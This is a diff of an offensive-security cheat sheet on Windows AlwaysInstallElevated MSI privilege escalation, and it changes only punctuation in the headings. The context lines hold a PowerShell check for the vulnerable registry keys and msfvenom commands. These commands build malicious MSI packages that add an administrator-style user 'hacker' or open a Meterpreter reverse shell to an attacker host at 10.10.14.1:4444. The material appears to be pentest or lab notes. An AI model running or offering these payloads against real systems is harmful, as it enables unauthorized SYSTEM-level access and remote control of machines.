@@ -1,4 +1,4 @@
-# AlwaysInstallElevated — MSI Privilege Escalation
+# AlwaysInstallElevated - MSI Privilege Escalation
 
 When both HKLM and HKCU `AlwaysInstallElevated` registry keys are set to 1, any user can install MSI packages with SYSTEM privileges.
 
@@ -20,7 +20,7 @@ $hkcu = (Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Insta
 if ($hklm -eq 1 -and $hkcu -eq 1) { Write-Output "[!] VULNERABLE - AlwaysInstallElevated is enabled" }
 ```
 
-## Exploitation — msfvenom MSI
+## Exploitation - msfvenom MSI
 
 ```bash
 # Reverse shell MSI
@@ -33,7 +33,7 @@ msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o meterpreter.msi
 ```
 
-## Exploitation — Manual MSI (WiX Toolset)
+## Exploitation - Manual MSI (WiX Toolset)
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
